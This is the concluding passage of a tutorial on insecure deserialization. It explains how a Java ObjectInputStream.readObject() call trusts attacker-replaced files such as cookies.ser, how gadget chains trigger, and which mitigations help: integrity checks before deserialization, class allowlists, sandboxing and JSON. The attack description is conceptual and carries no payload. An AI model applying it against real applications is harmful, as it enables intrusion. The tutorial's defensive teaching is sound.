```ClassNotFoundException``` is particularly relevant to deserialization. Suppose serialized data references:

```
EvilPayloadClass
```

…but the application lacks that class definition. Java then says: *“I don’t know how to reconstruct this object”* and throws ```ClassNotFoundException```.

**Where the Vulnerability Appears?**

This line is the core sink:

```
ois.readObject();
```

Because Java blindly trusts the serialized data. The application assumes:

- the file is legitimate

- the object is safe

- the serialized structure is trustworthy

But if an attacker replaces ```cookies.ser``` with malicious serialized data, that trust collapses. An attacker could replace object fields, inject unexpected object types, trigger gadget chains, abuse magic-like deserialization behavior. The danger is not merely: *“Reading bytes from a file.”* The danger is reconstructing live executable object state from attacker-controlled input.

OWASP mentions: *“An attacker could create a serialized object that executes OS commands when deserialized.”* This does NOT mean serialized data literally contains executable shellcode. Usually, instead:

- the object abuses existing application code

- dangerous methods execute during deserialization

- gadget chains trigger automatically

Before: *“The file contains data.”* Now: *“The file may secretly describe object behavior and execution flow.”*

### Mitigating Insecure Deserialization (Again):

After exploring:

- magic methods

- gadget chains

- PHAR abuse

- arbitrary object injection

- Java deserialization

- memory corruption

…the defensive picture becomes much clearer: *insecure deserialization is extremely difficult to secure safely once untrusted data reaches the deserializer.* That is why the safest mitigation remains: *avoid deserializing untrusted data whenever possible.* Traditional vulnerabilities often involve a dangerous function, a missing filter or a flawed query. Insecure deserialization is different. The problem is fundamentally architectural: *the application is reconstructing internal program state from attacker-controlled input.* This creates an enormous attack surface involving:

- object instantiation

- hidden execution paths

- framework internals

- third-party dependencies

- runtime behavior

**Conclusions:**

If deserialization is absolutely necessary, the serialized data should be cryptographically protected against tampering. Common approaches include:

- HMAC validation

- digital signatures

- integrity tokens

Validation must happen *before deserialization begins!* Otherwise:

- malicious objects may already be instantiated

- magic methods may already execute

- gadget chains may already trigger

At that point, integrity checks become meaningless.

Applications should strictly control *which classes may be deserialized* and *which object types are expected.* Many attacks rely on:

- injecting unexpected object types

- abusing dangerous framework classes

- triggering hidden methods

Restricting deserialization to a small whitelist significantly reduces reachable gadget surface and attacker flexibility. This is mitigation, not a perfect solution, because trusted classes may still contain dangerous behavior and new gadget chains may emerge later.

Another defensive strategy is: *isolate deserialization from the rest of the application.* Examples:

- separate processes

- containers

- sandboxes

- restricted environments

If exploitation occurs:

- filesystem access may be limited

- network access may be blocked

- system-level impact may be reduced

Instead of *“prevent compromise completely”* the goal becomes *“limit the blast radius.”*

Whenever possible: *prefer formats such as JSON instead of native object serialization!* JSON represents data structures and primitive values—not executable object behavior. However, JSON is not magically “secure.” Applications can still introduce injection flaws, logic vulnerabilities and unsafe parsing behavior. Still, JSON generally avoids automatic object reconstruction and hidden execution paths that make native deserialization so dangerous.

Many real-world deserialization exploits rely on vulnerable libraries, outdated frameworks or publicly known gadget chains. Keeping software updated helps reduce exposure to:

- known chains

- runtime vulnerabilities

- documented exploitation techniques

However, patching alone is not enough. The core issue is still deserializing untrusted data itself.

Throughout this journey, one idea repeatedly surfaced: *Serialization turns objects into data. Deserialization turns data back into live program state.* That reconstruction process is where trust becomes dangerous. Insecure deserialization is feared because it allows attackers to blur the line between passive input and active execution. The application no longer merely *reads* attacker-controlled data. Instead, it may begin rebuilding internal objects, invoking hidden behaviors, and executing trusted code paths shaped entirely by the attacker’s intentions. Once an application starts reconstructing attacker-controlled reality inside its own memory space, the distinction between “data” and “behavior” begins to collapse.

This cookbook is now concluded.
